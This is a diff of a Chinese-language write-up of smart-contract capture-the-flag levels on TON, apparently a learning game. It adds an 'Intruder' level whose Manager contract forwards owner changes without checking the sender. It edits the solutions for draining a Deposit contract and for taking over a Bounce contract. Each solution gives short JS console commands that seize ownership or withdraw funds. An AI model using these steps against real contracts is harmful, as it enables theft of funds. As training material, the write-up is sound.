@@ -49,7 +49,9 @@ tags:
 ## 1. DEPOSIT
 
 > You will beat this level if:
+
 > - Claim ownership of the contract
+
 > - Reduce its balance to 0
 
 ??? note "DepositLevel"
@@ -105,7 +107,7 @@ tags:
     }
     ```
 
-- 向合约发送 TON 以成为所有者
+- 只有所有者才能取出合约持有的 TON，首先向合约发送 TON 以成为所有者
 
     ```js
     > await player.send({to: contract.address.toString(), value: toNano("0.05")});
@@ -113,7 +115,7 @@ tags:
     > await contract.send(player, {value: toNano(0.05)}, null);
     ```
 
-- 使用 `withdraw` 取出合约所有资金
+- 使用 `withdraw` 取出合约中所有的资金
 
     ```js
     > await contract.send(player, {value: toNano(0.05)}, "withdraw"); 
@@ -307,7 +309,7 @@ tags:
 
 - 合约 `BounceLevel` 收到弹回的消息后就会将玩家设为合约所有者
 - 只需要在发送完 `start` 的三分钟后向 `BounceLevel` 发送 `finish`，让合约 `Timer` 抛出错误弹回消息即可
-    - 或直接向 `Timer` 发送 `start` 设置开始时间
+    - 或直接向 `Timer` 发送 `start` 设置自定义开始时间
 
     ```js
     > await contract.send(player, {value: toNano('0.05')}, "start");
@@ -318,6 +320,123 @@ tags:
     > await contract.send(player, {value: toNano('0.05')}, "finish"); 
     ```
 
-## References
+### References
 
 - [tact-lang / tact](https://github.com/tact-lang/tact/blob/ecae8d73c2cafef31c3c2ffebf1c69a5a89cb506/src/types/resolveSignatures.ts#L283-L291)
+
+## 4. INTRUDER
+
+> Claim ownership of the contract below to complete this level.
+
+??? note "IntruderLevel"
+
+    ```js
+    import "@stdlib/deploy";
+    import "./messages";
+
+    message(0x6e38a063) ChangeLevelOwner {
+        newOwner: Address;
+    }
+
+    message(0x6f13c225) ChangeClientOwner {
+        newOwner: Address;
+    }
+
+    message(0xa4e501ef) ChangeOwnerInternal {
+        newOwner: Address;
+    }
+
+    contract Manager with Deployable {
+        client: Address;
+        nonce: Int;
+
+        init(client: Address, nonce: Int) {
+            self.client = client;
+            self.nonce = nonce;
+        }
+
+        receive(msg: ChangeClientOwner) {
+            send(SendParameters{
+                to: self.client,
+                value: 0,
+                bounce: false,
+                mode: SendRemainingValue,
+                body: ChangeOwnerInternal{
+                    newOwner: msg.newOwner
+                }.toCell()
+            });
+        }
+    }
+
+    contract IntruderLevel with Deployable {
+        owner: Address;
+        player: Address;
+        nonce: Int;
+        manager: Address;
+
+        init(player: Address, nonce: Int) {
+            self.owner = sender();
+            self.player = player;
+            self.nonce = nonce;
+
+            let level_init: StateInit = initOf Manager(myAddress(), nonce);
+            self.manager = contractAddress(level_init);
+            send(SendParameters{
+                to: self.manager,
+                value: ton("0.01"),
+                bounce: false,
+                data: level_init.data,
+                code: level_init.code
+            });
+        }
+
+        receive(msg: ChangeLevelOwner) {
+            require(sender() == self.owner, "Wrong sender.");
+            send(SendParameters{
+                to: self.manager,
+                value: 0,
+                bounce: false,
+                mode: SendRemainingValue,
+                body: ChangeClientOwner{
+                    newOwner: msg.newOwner
+                }.toCell()
+            });
+        }
+
+        receive(msg: ChangeOwnerInternal) {
+            require(sender() == self.manager, "Wrong sender.");
+            self.owner = msg.newOwner;
+        }
+
+        receive("check") {
+            send(SendParameters{
+                to: sender(),
+                value: 0,
+                mode: SendRemainingValue,
+                bounce: false,
+                body: CheckLevelResult{
+                    name: "intruder",
+                    completed: self.owner == self.player
+                }.toCell()
+            });
+        }
+
+        get fun owner(): Address {
+            return self.owner;
+        }
+    }
+    ```
+
+- 只有 `manager` 能设置合约的所有者，而初始 `manager` 为 `Manager` 合约
+
+    ```js
+    message(0x6f13c225) ChangeClientOwner {
+        newOwner: Address;
+    }
+    ```
+
+- 可以向 `Manager` 合约发送 `ChangeClientOwner` 消息来设置 `IntruderLevel` 合约的所有者
+
+    ```js
+    > await player.send({to: Address.parse("kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_"), value: toNano("0.01"), body: beginCell().storeUint(0x6f13c225, 32).storeAddress(player.address).endCell()});
+    ```
